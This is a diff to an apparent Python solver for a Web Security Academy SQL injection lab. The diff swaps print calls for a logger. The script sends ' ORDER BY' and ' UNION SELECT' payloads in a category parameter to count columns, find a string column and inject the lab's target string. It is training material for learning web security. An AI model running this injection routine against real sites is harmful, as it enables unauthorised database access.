@@ -1,34 +1,34 @@
-from web_security_academy.core.utils import *
+from web_security_academy.core.logger import logger
 from bs4 import BeautifulSoup
 import re
 
 
 def solve_lab(session):
-    print_info("Extracting string value provided by lab...")
+    logger.info("Extracting string value provided by lab...")
     resp = session.get_path("/")
     soup = BeautifulSoup(resp.text, "lxml")
     hint = soup.select_one("#hint").text
 
     value = re.match(r"Make the database retrieve the string: '([^']+)'", hint).group(1)
-    print_success(f"Provided string value: {value}\n")
+    logger.success(f"Provided string value: {value}")
 
     path = "/filter"
-    print_info("Determining the number of columns...")
+    logger.info("Determining the number of columns...")
 
     num_columns = 0
     i = 1
     while True:
         params = {"category": f"' ORDER BY {i} --"}
         resp = session.get_path(path, params=params)
-        print_info_secondary(f"{params} => {resp.status_code}")
+        logger.info(f"{params} => {resp.status_code}")
         if resp.status_code == 500:
             break
         else:
             num_columns += 1
             i += 1
 
-    print_success(f"There are {num_columns} columns.\n")
-    print_info("Finding a column with the string data type...")
+    logger.success(f"There are {num_columns} columns.")
+    logger.info("Finding a column with the string data type...")
 
     i = 0
     while i < num_columns:
@@ -38,16 +38,17 @@ def solve_lab(session):
 
         params = {"category": f"' UNION SELECT {columns} -- //"}
         resp = session.get_path(path, params=params)
-        print_info_secondary(f"{params} => {resp.status_code}")
+        logger.info(f"{params} => {resp.status_code}")
         if resp.status_code == 200:
             break
         else:
             i += 1
 
     if i == num_columns:
-        print_fail("Unable to find a column with the string data type")
+        logger.failure("Unable to find a column with the string data type")
+        return
     else:
-        print_success(f"Column {i} has the string data type.\n")
+        logger.success(f"Column {i} has the string data type.")
 
     # Construct columns string
     columns = ["null"] * num_columns
@@ -55,10 +56,10 @@ def solve_lab(session):
     columns = ", ".join(columns)
     params = {"category": f"' UNION SELECT {columns} --"}
 
-    print_info(
+    logger.info(
         f'Performing SQL injection UNION attack by visiting "{path}" with the following parameters:'
     )
-    print(params)
+    logger.info(params)
 
     session.get_path(path, params=params)
-    print_success("SQL injection UNION attack performed.\n")
+    logger.success("SQL injection UNION attack performed.")
